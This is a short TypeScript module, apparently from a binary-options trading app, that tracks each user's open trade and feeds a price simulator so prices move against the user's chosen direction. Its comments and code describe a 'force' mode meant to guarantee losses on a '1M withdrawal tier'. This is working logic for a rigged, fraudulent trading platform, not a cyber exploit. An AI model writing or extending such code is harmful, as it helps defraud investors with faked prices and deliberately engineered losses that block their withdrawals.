// Per-symbol active-trade bias registry. Trading.tsx writes when a user opens a
// binary position; usePriceSimulation reads to nudge price *against* the user.
// Supports a "force" mode used to guarantee losses on the 1M withdrawal tier.

export interface ActiveBias {
  symbol: string;
  direction: "buy" | "sell"; // user's chosen direction
  openedAt: number;
  force?: boolean; // when true, price is pushed against the user every tick
}

const biases = new Map<string, ActiveBias>();

export const registerBias = (
  symbol: string,
  direction: "buy" | "sell",
  force = false
) => {
  biases.set(symbol, { symbol, direction, openedAt: Date.now(), force });
};

export const clearBias = (symbol: string) => {
  biases.delete(symbol);
};

export const getBias = (symbol: string): ActiveBias | undefined => biases.get(symbol);

// Returns +1 to bias price UP, -1 to bias DOWN, 0 if no active bias / expired
export const getBiasDirection = (symbol: string, lifetimeMs = 30000): number => {
  const b = biases.get(symbol);
  if (!b) return 0;
  if (Date.now() - b.openedAt > lifetimeMs) {
    biases.delete(symbol);
    return 0;
  }
  return b.direction === "buy" ? -1 : 1; // bias against the user
};

export const isForcedBias = (symbol: string, lifetimeMs = 30000): boolean => {
  const b = biases.get(symbol);
  if (!b) return false;
  if (Date.now() - b.openedAt > lifetimeMs) {
    biases.delete(symbol);
    return false;
  }
  return !!b.force;
};
